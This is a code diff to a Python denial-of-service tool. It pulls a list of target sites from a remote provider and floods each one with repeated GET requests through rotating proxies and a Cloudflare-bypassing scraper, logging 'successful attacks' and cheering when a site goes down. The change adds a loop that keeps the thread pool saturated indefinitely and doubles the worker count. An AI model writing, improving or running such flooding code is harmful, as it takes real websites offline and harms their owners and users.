@@ -1,9 +1,8 @@
-import json
 import os
 import platform
 
 from argparse import ArgumentParser
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 from gc import collect
 from os import system
 from sys import stderr
@@ -40,7 +39,9 @@ proxy_view = args.proxy_view
 
 remoteProvider = RemoteProvider(args.targets)
 threads = int(args.threads)
-executor = ThreadPoolExecutor(max_workers=threads)
+
+submitted_tasks = []
+executor = ThreadPoolExecutor(max_workers=threads * 2)
 
 logger.remove()
 logger.add(
@@ -62,7 +63,6 @@ def check_req():
 
 
 def mainth(site: str):
-    result = 'processing'
     scraper = cloudscraper.create_scraper(
         browser=settings.BROWSER, )
     scraper.headers.update(
@@ -71,9 +71,9 @@ def mainth(site: str):
          'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
          'Accept-Encoding': 'gzip, deflate, br'})
 
-    logger.info("STARTING ATTACK TO " + site)
+    logger.info("STARTING ATTACK ON " + site)
 
-    attacks_number = 0
+    count_attacks_for_current_site = 0
 
     try:
         attack = scraper.get(site, timeout=settings.READ_TIMEOUT)
@@ -86,31 +86,25 @@ def mainth(site: str):
                     {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                 response = scraper.get(site, timeout=10)
                 if 200 <= response.status_code <= 302:
-                    while (attacks_number < settings.MAX_REQUESTS_TO_SITE):
+                    while (count_attacks_for_current_site < settings.MAX_REQUESTS_TO_SITE):
                         response = scraper.get(site, timeout=10)
                         if response.status_code >= 400:
                             break
-                        attacks_number += 1
-                        logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
+                        count_attacks_for_current_site += 1
+                        logger.info(f"Successful attack of {site}; attack count: {count_attacks_for_current_site}; code: {response.status_code}")
         else:
-            while (attacks_number < settings.MAX_REQUESTS_TO_SITE):
+            while (count_attacks_for_current_site < settings.MAX_REQUESTS_TO_SITE):
                 response = scraper.get(site, timeout=10)
                 if response.status_code >= 400:
                     break
-                attacks_number += 1
-                logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
-        if attacks_number > 0:
-            logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
-        # when thread finishes, add new task to executor
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+                count_attacks_for_current_site += 1
+                logger.info(f"ATTACKED {site}; attack count: {count_attacks_for_current_site}; RESPONSE CODE: {response.status_code}")
+        if count_attacks_for_current_site > 0:
+            logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(count_attacks_for_current_site))
     except ConnectionError as exc:
-        logger.success(f"{site} is down")
-        # when thread finishes, add new task to executor
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+        logger.success(f"{site} is down! =^_^=")
     except Exception as exc:
-        logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
-        # when thread finishes, add new task to executor
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+        logger.warning(f"Error: {exc}; number of successful attacks: {count_attacks_for_current_site}")
 
 def clear():
     if platform.system() == "Linux":
@@ -127,6 +121,16 @@ def cleaner():
             clear()
         collect()
 
+def runningTasksCount():
+    r = 0
+    for task in submitted_tasks:
+        if task.running():
+            r += 1
+        if task.done():
+            submitted_tasks.remove(task)
+        if task.cancelled():
+            submitted_tasks.remove(task)
+    return r
 
 if __name__ == '__main__':
     if not no_clear:
@@ -136,4 +140,14 @@ if __name__ == '__main__':
     sites = remoteProvider.get_target_sites()
     # initially start as many tasks as configured threads
     for _ in range(threads):
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+        submitted_tasks.append(executor.submit(mainth, choice(remoteProvider.get_target_sites())))
+
+    while True:
+        currentRunningCount = runningTasksCount()
+        logger.info("Currently running tasks:  " + str(currentRunningCount))
+
+        while currentRunningCount < threads:
+            submitted_tasks.append(executor.submit(mainth, choice(remoteProvider.get_target_sites())))
+            currentRunningCount += 1
+        sleep(1)
+
